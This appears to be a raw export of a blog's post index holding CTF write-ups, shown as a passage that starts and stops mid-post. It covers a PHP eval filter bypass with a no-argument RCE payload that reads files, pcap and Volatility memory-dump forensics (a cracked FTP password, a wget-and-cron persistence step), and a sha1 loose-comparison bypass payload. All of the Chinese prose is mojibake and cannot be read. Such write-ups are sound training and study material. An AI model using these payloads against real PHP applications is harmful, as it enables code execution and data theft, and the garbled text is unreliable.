class="string">&#x27;/file|if|localeconv|phpversion|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|var_dump|pos|current|array|time|se|ord/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;What are you thinking?&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Please calm down&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=show_source(end(scandir(chr(ceil(sinh(cosh(tan(ceil(tan(ceil(zend_version())))))))))));</span><br></pre></td></tr></table></figure><p><img src="/images/cqgamectf-1/1.png" alt="image-20220402164521180"></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ— å‚æ•°rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OFPPT-CTF-2022-writeup</title>
      <link href="/2022/04/08/OFPPT-CTF-2022-writeup/"/>
      <url>/2022/04/08/OFPPT-CTF-2022-writeup/</url>
      
        <content type="html"><![CDATA[<h3 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h3><h4 id="pcap-analysis1"><a href="#pcap-analysis1" class="headerlink" title="pcap analysis1"></a>pcap analysis1</h4><p>è€ƒç‚¹:æµé‡åˆ†æ</p><p><a href="/images/ofppt-ctf-2022/pcap-analysis.7z">æµé‡åŒ…ä¸‹è½½</a></p><p>ç¬¬ä¸€é¢˜ï¼Œå› ä¸ºè‹±è¯­å¤ªèœäº†ï¼Œè¿™é‡Œç¿»è¯‘ä¸€ä¸‹ï¼Œå¤§è‡´çš„æ„æ€å°±æ˜¯è¢«å…¥ä¾µäº†ï¼Œç„¶ååˆ†æä¸€ä¸‹ï¼Œè¿™ä¸ªäººåœ¨æœç´¢å¼•æ“ä¸ŠæŸ¥æ‰¾äº†ä»€ä¹ˆ</p><p><img src="/images/ofppt-ctf-2022/1.png" alt="image-20220408210409793"></p><p>æˆ‘ä»¬è¿™é‡Œç›´æ¥ç­›é€‰httpæµé‡ï¼Œéšä¾¿ç‚¹ä¸€ä¸ªï¼Œçœ‹åˆ°ä½¿ç”¨çš„æ˜¯ç™¾åº¦ï¼Œéšä¾¿æœç´¢ä¸€ä¸ªåå­—ï¼Œå°±å¯ä»¥çœ‹åˆ°ï¼Œwdå¯¹åº”çš„å€¼å°±æ˜¯æˆ‘ä»¬æœç´¢çš„å†…å®¹ï¼Œ</p><p><img src="/images/ofppt-ctf-2022/2.png" alt="image-20220408211238126"></p><p><img src="/images/ofppt-ctf-2022/3.png" alt="image-20220408211344064"></p><p><img src="/images/ofppt-ctf-2022/4.png" alt="image-20220408211438318"></p><p>è¿™é‡Œæˆ‘ä»¬ç›´æ¥ç”¨ç®€å•æ–¹æ³•ï¼Œæ–‡ä»¶å¯¼å‡ºé¦–é€‰é¡¹ï¼Œä¸‹é¢æœ‰å…¨éƒ¨çš„urlï¼Œè¿™é‡Œç›´æ¥æŠ„å°±è¡Œäº†ã€‚</p><p><img src="/images/ofppt-ctf-2022/5.png" alt="image-20220408212025332"></p><p>OFPPT-CTF{charles_geschickter}</p><h4 id="pcap-analysis2"><a href="#pcap-analysis2" class="headerlink" title="pcap analysis2"></a>pcap analysis2</h4><p>wiresharkæå–ftpæµé‡åŒ…</p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è®¸å¤šftpçš„åè®®ï¼Œæˆ‘ä»¬ç›´æ¥å¸…é€‰ftpçš„æµé‡ï¼Œå¾€ä¸‹ç¿»ä¸€ç•ªï¼Œéšä¾¿æ‰¾ä¸ªrequeståŒ…ï¼Œå³é”®è¿½è¸ªæµå°±å¯ä»¥çœ‹åˆ°äº†ï¼Œ</p><p><img src="/images/ofppt-ctf-2022/6.png" alt="image-20220408212631031"></p><p>å› ä¸ºé¢˜ç›®çš„è¦æ±‚æ˜¯ç›¸åŒæ–‡ä»¶åï¼Œåç¼€ä¸åŒï¼Œæ‰€ä»¥å°±æ˜¯è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œæ¥ä¸‹æ¥æå–è¿™ä¸¤åŒ…</p><p><img src="/images/ofppt-ctf-2022/7.png" alt="image-20220408212848843"></p><p>è¿™é‡Œç›´æ¥æœç´¢lytton-crypt.binä¸‹é¢ftpdataå°±æ˜¯æ•°æ®ï¼Œç›´æ¥è¿½è¸ª</p><p><img src="/images/ofppt-ctf-2022/8.png" alt="image-20220408213524053"></p><p>è°ƒæˆåŸå§‹æ•°æ®ï¼Œsave</p><p><img src="/images/ofppt-ctf-2022/9.png" alt="image-20220408213738041"></p><p>lytton-crypt.bin</p><p>MD5: 4da8e81ee5b08777871e347a6b296953<br>SHA1: 5f88cfb5e469154782aa84a6b649007423c8b196<br>SHA256: 22190203d1789b181eb7230ceeafffe440b33883e185470b7cf64ab22fb3ba9f<br>CRC32: 2859590343</p><p>lytton-crypt.exe åŒç†</p><p><img src="/images/ofppt-ctf-2022/10.png" alt="image-20220408213950236"></p><p>MD5: 9cb9b11484369b95ce35904c691a5b28<br>SHA1: 4463adb39c4381b87c76180543c401c2bfa89962<br>SHA256: b7da7228ac44bd90aedf34660a04d15bf1ddf84c1a4823234c3abf506a254b8b<br>CRC32: 3745826804</p><blockquote><p>OFPPT-CTF{9cb9b11484369b95ce35904c691a5b28|4da8e81ee5b08777871e347a6b296953}</p></blockquote><h4 id="pcap-analysis3"><a href="#pcap-analysis3" class="headerlink" title="pcap analysis3"></a>pcap analysis3</h4><p>The attacker cracked a password belonging to the victim. Submit the flag as: OFPPT-CTF{password}.</p><p>è¿™é¢˜å°±æ¯”è¾ƒç®€å•äº†ï¼Œè¯´æ”»ç ´äº†å¯†ç ï¼Œæˆ‘ä»¬åˆšåˆšåœ¨ftpæœåŠ¡å™¨ä¸Šçœ‹åˆ°äº†ç™»é™†çš„ç—•è¿¹ï¼Œå»æ‰¾ä¸€ä¸‹å¯†ç ï¼Œç›´æ¥æœç´¢tcpå’Œ200å°±è¡Œï¼Œæˆ–è€…utf8ä¹Ÿå¯ä»¥ï¼Œè¿½è¸ªä¸€ä¸‹ï¼Œå°±å¯ä»¥çœ‹åˆ°ç™»å½•æˆåŠŸäº†</p><p><img src="/images/ofppt-ctf-2022/11.png" alt="image-20220408215301907"></p><p><img src="/images/ofppt-ctf-2022/12.png" alt="image-20220408215400191"></p><p>USER cgeschickter</p><p>331 Password required</p><p>PASS darkangel</p><p>230 User logged in.</p><blockquote><p>OFPPT-CTF{darkangel}</p></blockquote><h4 id="pcap-analysis4"><a href="#pcap-analysis4" class="headerlink" title="pcap analysis4"></a>pcap analysis4</h4><p>4è¿™é‡Œè¯´æ‰§è¡Œäº†ä¸€ä¸ªæ–‡ä»¶<br>The attacker made a fatal mistake, and in doing so, gave control of his computer toâ€¦ someone. he shouldnâ€™t have run that malicious program.</p><p>æˆ‘ä»¬åœ¨æœç´¢httpæµé‡æ—¶ï¼Œæ‰¾åˆ°ä¸€ä¸ªsecret_decoder.binï¼Œæœç´¢è¿™ä¸ªå…³é”®å­—æ—¶ï¼Œå‘ç°</p><p><img src="/images/ofppt-ctf-2022/13.png" alt="image-20220408215914265"></p><p><img src="/images/ofppt-ctf-2022/14.png" alt="image-20220408220108310"></p><p>.106çš„æœºå™¨åœ¨105ä¸Šæ‰§è¡Œäº†å‘½ä»¤</p><p><strong>ä½¿ç”¨wget -Oä¸‹è½½å¹¶ä»¥ä¸åŒçš„æ–‡ä»¶åä¿å­˜</strong></p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°wgetäº†ä¸€ä¸ªæ–‡ä»¶ä¸”é‡å‘½åäº†ï¼Œä¹‹åæ”¹äº†æƒé™ï¼Œç„¶åå¢åŠ äº†å®šæ—¶ä»»åŠ¡ï¼Œè¯´æ˜æ‰§è¡Œçš„å°±æ˜¯è¿™ä¸ªsecret_decoder.binæ–‡ä»¶</p><p><img src="/images/ofppt-ctf-2022/15.png" alt="image-20220408220220107"></p><p>è¿™é‡Œå› ä¸ºä»–åœ¨æœ€åhttpè¯·æ±‚äº†è¿™ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬ç›´æ¥å¯¼å‡ºå°±è¡Œ,å’Œftpå¯¼å‡ºä¸€æ ·.</p><p><img src="/images/ofppt-ctf-2022/16.png" alt="image-20220408220615646"></p><p>å¯¼å‡ºä¹‹åå–ä¸€ä¸‹æ–‡ä»¶md5å°±è¡Œäº†</p><p>MD5: 42e419a6391ca79dc44d7dcef1efc83b<br>SHA1: e96c5e687d827f5a250fc643d1e9ff46e2c531bc<br>SHA256: 358489fcab70c3f10c4628e09c1ccbd001915f6adfa7fa97a1be0fb5fbab8198<br>CRC32: 2929409365</p><p><img src="/images/ofppt-ctf-2022/17.png" alt="image-20220408205826205"><br><img src="/images/ofppt-ctf-2022/18.png" alt="image-20220408205858332"></p><blockquote><p>OFPPT-CTF{42e419a6391ca79dc44d7dcef1efc83b}</p></blockquote><h4 id="pcapanalysis5"><a href="#pcapanalysis5" class="headerlink" title="pcapanalysis5"></a>pcapanalysis5</h4><p>The attacker started by performing a port scan of the victim computer.<br>Identify the open TCP ports discovered on the victimâ€™s machine? Enter the flag as the open ports, separated by commas, no spaces, in numerical order. Disregard port numbers &gt; 10000. Example: OFPPT-CTF{80,110,111,143,443,2049} Use the PCAP file from â€˜pcap analysisâ€™ challenge.</p><p>è¿™é‡Œæˆ‘ä»¬å…ˆæ¨æ–­ä¸€ä¸‹ï¼Œå› ä¸ºåœ¨æ•°æ®åŒ…ä¸­106çš„ipå¯¹103çš„ipè¿›è¡Œäº†ftpå¯†ç çˆ†ç ´ï¼Œæ‰€ä»¥106ä¸ºæ”»å‡»è€…ï¼Œ103ä¸ºå—å®³è€…ä¸”å‡è®¾çš„ä¸ºftpæœåŠ¡ã€‚<br>ç­›é€‰ä¸€ä¸‹ç›®çš„ip<code>ip.dst == 192.168.100.103</code></p><p><img src="/images/ofppt-ctf-2022/19.png" alt="image-20220409211513430"></p><p><img src="/images/ofppt-ctf-2022/20.png" alt="image-20220409212805266"></p><p>å¯ä»¥çœ‹åˆ°åœ¨æ‰«æç«¯å£ï¼Œå¾€ä¸‹æ‹‰ä¸€æ‹‰ä¼šçœ‹åˆ°è¯·æ±‚æˆåŠŸçš„ç«¯å£ï¼Œä¸€å…±æœ‰äº”ä¸ªã€‚è¿™é‡Œæˆ‘çš„æ–¹æ³•ä¸æ¨èï¼Œä¸‹é¢è¿™ä¸ªæ˜¯ä¸€ä¸ªå¤§å¸ˆå‚…çš„æ–¹æ³•ï¼Œé“¾æ¥<code>https://hhyleung.github.io/writeups/ofppt-ctf-2022/#pcap-analysis-6</code></p><p><img src="/images/ofppt-ctf-2022/21.png" alt="image-20220409213029038"></p><blockquote><p>A port scan is usually done with the TCP handshake, which ends with <code>SYN, ACK</code> if the port is opened. &gt;The filter <code>tcp.flags.ack == 1 and tcp.flags.syn == 1</code> was used to filter out the completed &gt;handshakes and it was found that ports <code>21</code>, <code>135</code>, <code>139</code>, <code>445</code>, and <code>3389</code> were opened.</p></blockquote><p>åŠ ä¸Šipå°±æ›´æ¸…æ™°äº†<code>tcp.flags.ack == 1 and tcp.flags.syn == 1 and ip.addr == 192.168.100.103</code></p><p><img src="/images/ofppt-ctf-2022/22.png" alt="image-20220409214123092"></p><blockquote><p>OFPPT-CTF{21,135,139,445,3389} </p></blockquote><h4 id="pcap-analysis6"><a href="#pcap-analysis6" class="headerlink" title="pcap analysis6"></a>pcap analysis6</h4><p>The attacker might have just bit off more than he can chew! he encountered a competitor that is counter-attacking his system!<br>The competitor executed a command to attain persistence on the attackerâ€™s computer. This command will allow the adversary to regain a connection to the computer even after reboot. What is the packet number where this command was executed? For example: OFPPT-CTF{93721}. Use the PCAP file from â€˜pcap analysisâ€™ challenge.</p><p>å‰é¢æˆ‘ä»¬çŸ¥é“åŠ äº†è®¡åˆ’ä»»åŠ¡ï¼Œä¹Ÿå°±æ˜¯ç›´æ¥æœsudo å°±å¯ä»¥äº†ï¼Œè¯¥åŒ…çš„å·ä¸º160468</p><p><img src="/images/ofppt-ctf-2022/23.png" alt="image-20220409214555530"></p><blockquote><p>OFPPT-CTF{160468} </p></blockquote><h4 id="Windows-memory-dump"><a href="#Windows-memory-dump" class="headerlink" title="Windows memory dump"></a>Windows memory dump</h4><p>A Windows computer has been infected. The attacker managed to exploit a portion of a database backup that contains sensitive employee and customer private information. All memory dump challenges use the same file.<br>Inspect the memory dump and tell us the Windows Major Operating System Version, bit version, and the image date/time (UTC, no spaces or special characters). Submit the flag as OFPPT-CTF{OS_BIT_YYYYMMDDhhmmss}. Example: OFPPT-CTF{WindowsXP_32_20220120095959} File: 1.5 GB Decompressed: 5 GB</p><p>è¿™é‡Œå–è¯é¢˜ï¼Œç¬¬ä¸€æ¬¡é‡åˆ°win10çš„é•œåƒï¼Œè®°å½•ä¸€ä¸‹</p><p>å…ˆçœ‹ä¸€ä¸‹é•œåƒä¿¡æ¯<code>â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility] â””â”€# python2 vol.py -f ../ctf/ofppt/physmemraw imageinfo</code><br>ç”±äºè¿™ä¸ªæ–‡ä»¶å¾ˆå¤§ 5G,æ‰«ææ‰«äº†å¾ˆä¹…ï¼ŒæŸ¥ä¸å¤šäº”åˆ†é’Ÿï¼Œæˆ‘ä¸€åº¦ä»¥ä¸ºæ˜¯æˆ‘æ“ä½œä¸å¯¹ã€‚åæ¥å‘ç°ä¸æ˜¯ï¼Œå•çº¯çš„æ˜¯å› ä¸ºæ–‡ä»¶å¤§</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€<span class="comment"># python2 vol.py -f ../ctf/ofppt/physmemraw imageinfo</span></span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win10x64_19041</span><br><span class="line">                     AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (/tools/ctf/ofppt/physmemraw)</span><br><span class="line">                      PAE <span class="built_in">type</span> : No PAE</span><br><span class="line">                           DTB : 0x1aa000L</span><br><span class="line">                          KDBG : 0xf8005e600b20L</span><br><span class="line">          Number of Processors : 4</span><br><span class="line">     Image Type (Service Pack) : 0</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 0 : 0xfffff8005ba60000L</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 1 : 0xffff82804f9c0000L</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 2 : 0xffff82804f5e8000L</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 3 : 0xffff82804f7ca000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xfffff78000000000L</span><br><span class="line">           Image date and time : 2021-09-07 14:57:44 UTC+0000</span><br><span class="line">     Image <span class="built_in">local</span> date and time : 2021-09-07 07:57:44 -0700</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯64ä½çš„win10ï¼Œæ‰€ä»¥flag</p><blockquote><p>OFPPT-CTF{Windows10_64_20210907145744} </p></blockquote><h4 id="Windows-memory-dump2"><a href="#Windows-memory-dump2" class="headerlink" title="Windows memory dump2"></a>Windows memory dump2</h4><table><thead><tr><th>envars</th><th>æ˜¾ç¤ºè¿›ç¨‹çš„ç¯å¢ƒå˜é‡</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€# python2 vol.py -f ../ctf/ofppt/physmemraw --profile=Win10x64_19041 envars | grep COMPUTE</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">     568 wininit.exe          0x000002760e625ed0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     644 winlogon.exe         0x000002a6290b71e0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     668 services.exe         0x0000018faf8027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     708 lsass.exe            0x00000234422027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     832 svchost.exe          0x000001e39d6027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     952 svchost.exe          0x000001c6c2e027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     996 svchost.exe          0x000002da882027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     428 dwm.exe              0x0000019f91800fe0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br></pre></td></tr></table></figure><blockquote><p>OFPPT-CTF{DESKTOP-IT8QNRI}</p></blockquote><h4 id="Windows-memory-dump3"><a href="#Windows-memory-dump3" class="headerlink" title="Windows memory dump3"></a>Windows memory dump3</h4><p>Using the memory dump file from Window memory dump challenge, find out the name of the malicious process.<br>Submit the flag as OFPPT-CTF{process-name_pid} (include the file extension). Example: OFPPT-CTF{svchost.exe_1234}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€# python2 vol.py -f ../ctf/ofppt/physmemraw --profile=Win10x64_19041 pstree                                                                         130 â¨¯</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Name                                                  Pid   PPid   Thds   Hnds Time</span><br><span class="line">-------------------------------------------------- ------ ------ ------ ------ ----</span><br><span class="line"> 0xffff9a077fead080:wininit.exe                       568    456      1      0 2021-09-07 14:24:53 UTC+0000</span><br><span class="line">. 0xffff9a077ff1d080:lsass.exe                        708    568     13      0 2021-09-07 14:24:55 UTC+0000</span><br><span class="line">. 0xffff9a077ff54140:fontdrvhost.ex                   864    568      5      0 2021-09-07 14:24:55 UTC+0000</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"> 0xffff9a07843ab080:userinit.exe                     8180   2252      3      0 2021-09-07 14:55:55 UTC+0000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€# python2 vol.py -f ../ctf/ofppt/physmemraw --profile=Win10x64_19041 cmdline | grep 8180</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">userinit.exe pid:   8180</span><br></pre></td></tr></table></figure><blockquote><p>OFPPT-CTF{userinit.exe_8180}</p></blockquote><h4 id="Windows-memory-dump4"><a href="#Windows-memory-dump4" class="headerlink" title="Windows memory dump4"></a>Windows memory dump4</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€<span class="comment"># python2 vol.py -f ../ctf/ofppt/physmemraw --profile=Win10x64_19041 dumpfiles --pid 8180 --dump-dir=../ctf/ofppt/                                    1 â¨¯</span></span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">ImageSectionObject 0xffff9a077f6d01a0   8180   \Device\HarddiskVolume2\Windows\SysWOW64\sechost.dll</span><br><span class="line">DataSectionObject 0xffff9a077f61f0d0   8180   \Device\HarddiskVolume2\Windows\System32\locale.nls</span><br><span class="line">ImageSectionObject 0xffff9a07857d4280   8180   \Device\HarddiskVolume2\Windows\Temp\userinit.exe</span><br><span class="line">ImageSectionObject 0xffff9a0784c4e590   8180   \Device\HarddiskVolume2\Windows\SysWOW64\cryptsp.dll</span><br><span class="line">ImageSectionObject 0xffff9a0784c6fa60   8180   \Device\HarddiskVolume2\Windows\System32\icuin.dll</span><br><span class="line">ImageSectionObject 0xffff9a0784c6f740   8180   \Device\HarddiskVolume2\Windows\System32\icuuc.dll</span><br><span class="line">DataSectionObject 0xffff9a0785d549b0   8180   \Device\HarddiskVolume2\Windows\System32\en-US\WWAHost.exe.mui</span><br><span class="line">DataSectionObject 0xffff9a0785d5ba30   8180   \Device\HarddiskVolume2\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_18.2106.12410.0_x64__8wekyb3d8bbwe\microsoft.system.package.metadata\S-1-5-21-1114333211-2247716564-2192578087-1001-MergedResources-0.pri</span><br><span class="line">DataSectionObject 0xffff9a077fefc730   8180   \Device\HarddiskVolume2\Windows\Globalization\Sorting\SortDefault.nls</span><br><span class="line">DataSectionObject 0xffff9a078480c5f0   8180   \Device\HarddiskVolume2\Windows\System32\en-US\edgehtml.dll.mui</span><br><span class="line">DataSectionObject 0xffff9a0780c1ced0   8180   \Device\HarddiskVolume2\Windows\ServiceProfiles\LocalService\AppData\Local\FontCache\~FontCache-System.dat</span><br><span class="line">DataSectionObject 0xffff9a0780d38620   8180   \Device\HarddiskVolume2\Windows\System32\en-US\KernelBase.dll.mui</span><br><span class="line">DataSectionObject 0xffff9a07809f4a30   8180   \Device\HarddiskVolume2\Windows\System32\en-US\dnsapi.dll.mui</span><br><span class="line">DataSectionObject 0xffff9a078482feb0   8180   \Device\HarddiskVolume2\Windows\ServiceProfiles\LocalService\AppData\Local\FontCache\~FontCache-S-1-5-21-1114333211-2247716564-2192578087-1001.dat</span><br></pre></td></tr></table></figure><p>ImageSectionObject 0xffff9a07857d4280   8180   \Device\HarddiskVolume2\Windows\Temp\userinit.exe</p><p>æœªå‡ºï¼Œå€Ÿä¸€ä¸‹å¤§å¸ˆå‚…çš„writeup</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ vol -f physmemraw windows.dumpfiles --pid 8180</span><br><span class="line"></span><br><span class="line">Volatility 3 Framework 2.0.2</span><br><span class="line">Progress:  100.00               PDB scanning finished  </span><br><span class="line">Cache   FileObject      FileName        Result</span><br><span class="line"></span><br><span class="line">ImageSectionObject      0x9a077f6d01a0  sechost.dll     file.0x9a077f6d01a0.0x9a077f0ddb20.ImageSectionObject.sechost.dll.img</span><br><span class="line">ImageSectionObject      0x9a07857d4280  userinit.exe    file.0x9a07857d4280.0x9a07843b6a90.ImageSectionObject.userinit.exe.img</span><br><span class="line">ImageSectionObject      0x9a0784c4e590  cryptsp.dll     file.0x9a0784c4e590.0x9a0784bbca20.ImageSectionObject.cryptsp.dll.img</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">â””â”€$ sha1sum file.0x9a07857d4280.0x9a07843b6a90.ImageSectionObject.userinit.exe.img</span><br><span class="line">962d96f30c8f126cbcdee6eecc5e50c3a408402b  file.0x9a07857d4280.0x9a07843b6a90.ImageSectionObject.userinit.exe.img</span><br></pre></td></tr></table></figure><p>Flag: <code>OFPPT-CTF&#123;962d96f30c8f126cbcdee6eecc5e50c3a408402b&#125;</code></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hash&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;hash&#x27;</span>] === <span class="string">&quot;10932435112&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Not so easy mate.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$hash</span> = sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;hash&#x27;</span>]);</span><br><span class="line">    <span class="variable">$target</span> = sha1(<span class="number">10932435112</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$hash</span> == <span class="variable">$target</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;csictf&#123;loser&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"> ?hash=aaroZmOk</span><br></pre></td></tr></table></figure><blockquote><p>å‚è€ƒ<a href="https://hhyleung.github.io/writeups/ofppt-ctf-2022/">https://hhyleung.github.io/writeups/ofppt-ctf-2022/</a></p><blockquote><p>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> å–è¯ </tag>
            
            <tag> æµé‡åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022Space Heroes CTF</title>
      <link href="/2022/04/03/2022Space-Heroes-CTF/"/>
      <url>/2022/04/03/2022Space-Heroes-CTF/</url>
      
        <content type="html"><![CDATA[<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="R2D2"><a href="#R2D2" class="headerlink" title="R2D2"></a>R2D2</h5><p>æç¤ºrobotæœºå™¨äººï¼Œç›´æ¥è®¿é—®robots.txtå³å¯</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20220403204930418.png" alt="image-20220403204930418"></p><h3 id="Space-Traveler"><a href="#Space-Traveler" class="headerlink" title="Space Traveler"></a>Space Traveler</h3><p>å‰ç«¯éªŒè¯ï¼Œç›´æ¥å³é”®æºä»£ç ï¼Œ</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var 